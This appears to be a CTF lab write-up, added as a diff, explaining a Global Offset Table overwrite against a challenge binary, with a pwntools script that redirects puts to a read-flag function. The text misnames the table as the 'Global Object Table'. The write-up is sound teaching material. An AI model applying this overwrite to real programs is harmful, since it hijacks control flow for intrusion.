@@ -1,0 +1,49 @@
+20240422
+
+For brevity, I'm going to skip over the first 4 challenges, as they are just pwntools exercises.
+
+Dynamically linked binaries reference the Global Object Table to find glibc functions. We are given a binary with a read-flag function, and the ability to overwrite any 8 bytes with any other 8 bytes. We can use `objdump` on the elf to determine the location of the read-flag function and the `puts` function. We can then use the packing function of pwntools to send in the address to overwrite, and the new address to target. This will overwrite the `puts("goodbye")` function to give us the flag.
+```py
+from pwn import *
+
+  
+
+# Connect to the remote server or local process
+
+# Replace 'hostname' and 'port' with appropriate values
+
+r = remote('chal.ctf-league.osusec.org', port)
+
+  
+
+# Read raw bytes from memory (assuming you have a function to read the bytes)
+
+  
+
+puts = 0x00404008
+
+pays = 0x00401186
+
+  
+
+print("puts: ", p64(puts))
+
+print("pays: ", p64(pays))
+
+  
+  
+
+r.recv()
+
+r.sendline("1")
+
+r.send(p64(puts))
+
+r.send(p64(pays))
+
+print(r.recv())
+
+  
+
+r.interactive()
+```
